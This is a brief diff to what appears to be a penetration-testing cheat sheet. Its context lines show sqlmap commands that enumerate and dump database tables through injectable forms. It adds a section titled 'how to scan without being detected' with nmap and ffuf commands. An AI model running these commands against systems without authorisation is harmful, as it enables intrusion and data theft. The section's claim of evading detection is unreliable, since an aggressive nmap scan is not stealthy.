@@ -76,3 +76,7 @@ Once you find the name of a database enumerate by doing:
 sqlmap -u URL --forms -D DATABASE --tables --threads 10
 When you have the name of the table enumerate it by doing:
 sqlmap -u URL --forms -T TABLENAME --dump --threads 10
+________________________________________________________________________________
+HOW TO SCAN WITHOUT BEING DETECTED:
+nmap -A -F IP -v
+ffuf -w WORDLIST -u URL -p SECONDS
